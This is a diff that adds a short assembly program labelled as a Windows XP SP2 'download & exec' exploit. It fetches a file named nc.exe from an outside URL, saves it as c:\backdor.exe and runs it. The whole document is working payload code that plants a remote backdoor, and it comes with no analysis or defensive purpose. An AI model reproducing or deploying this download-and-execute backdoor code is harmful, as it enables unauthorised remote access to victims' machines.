@@ -1,0 +1,48 @@
+Exploit Title  winxp sp2 fr  download & exec                             ::
+Date 06/5/2010
+Author : Crack_MaN                             ::
+
+
+code:
+
+
+
+;-------------------------------------------
+
+.586
+.model flat,stdcall
+option casemap:none
+
+   include windows.inc
+   include user32.inc
+   include kernel32.inc
+   include shell32.inc
+   include urlmon.inc
+   
+   includelib user32.lib
+   includelib kernel32.lib
+   includelib shell32.lib
+   includelib urlmon.lib
+
+.data
+URL db "http://www.site.com/nc.exe",0
+PATH db "c:\backdor.exe",0
+
+.data?
+hResult dd ? 
+
+.code
+
+
+; ---------------------------------------------------------------------------
+
+
+start:
+
+   invoke URLDownloadToFile,0,addr URL,addr PATH,0,0
+    mov hResult,eax
+    .if eax!=1
+    	invoke ShellExecute,0,0,addr PATH,0,0,SW_SHOW
+    	 .endif
+
+end start
